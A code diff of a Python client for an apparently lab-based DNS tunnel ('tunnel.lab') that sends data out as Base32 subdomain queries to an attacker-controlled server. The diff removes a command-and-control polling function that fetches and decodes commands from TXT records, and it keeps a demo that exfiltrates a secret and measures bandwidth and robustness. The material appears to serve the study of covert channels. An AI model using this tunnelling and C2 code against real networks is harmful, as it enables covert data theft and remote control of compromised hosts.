@@ -5,8 +5,6 @@ DNS Tunnel – Compromised Client
 Encodes arbitrary data as Base32 subdomains and transmits it via DNS
 queries to the attacker-controlled authoritative server.
 
-Also polls the C2 channel for incoming commands.
-
 Usage
 -----
   python client.py --demo          # run full demo + measurements
@@ -22,12 +20,11 @@ import subprocess
 import sys
 import time
 from dataclasses import dataclass, field
-from typing import List, Optional
+from typing import List
 
 import dns.message
 import dns.query
 import dns.rdatatype
-import dns.rdtypes.ANY.TXT
 
 # ── Configuration ─────────────────────────────────────────────
 TUNNEL_DOMAIN = "tunnel.lab"
@@ -120,25 +117,6 @@ def send_data(data: str, verbose: bool = True) -> TxResult:
     return result
 
 
-# ── C2 poll ───────────────────────────────────────────────────
-
-def poll_command() -> Optional[str]:
-    """Query the C2 channel; decode and return any pending command."""
-    qname = f"cmd.{SESSION_ID}.{TUNNEL_DOMAIN}"
-    try:
-        req = dns.message.make_query(qname, dns.rdatatype.TXT)
-        resp = dns.query.udp(req, RESOLVER_IP, timeout=2.0)
-        if resp.answer:
-            txt_data = b"".join(resp.answer[0][0].strings)
-            raw = txt_data.decode()
-            if raw == "none":
-                return None
-            return b32_decode(raw).decode("utf-8")
-    except Exception:
-        pass
-    return None
-
-
 # ── Metric measurements ───────────────────────────────────────
 
 def measure_bandwidth(sizes: List[int] = (64, 256, 1024), runs: int = 3) -> dict:
@@ -225,15 +203,7 @@ def run_demo():
     )
     send_data(secret)
 
-    print("\n── Step 2: C2 channel (poll for commands) ─────────")
-    print("  Polling server for commands…")
-    cmd = poll_command()
-    if cmd:
-        print(f"  [C2] Received command: {cmd!r}")
-    else:
-        print("  [C2] No pending command.")
-
-    print("\n── Step 3: Measurements ───────────────────────────")
+    print("\n── Step 2: Measurements ───────────────────────────")
     bw_results  = measure_bandwidth(sizes=[64, 256, 1024], runs=3)
     rob_results = measure_robustness(loss_rates=[0, 5, 10, 20], runs=3)
 
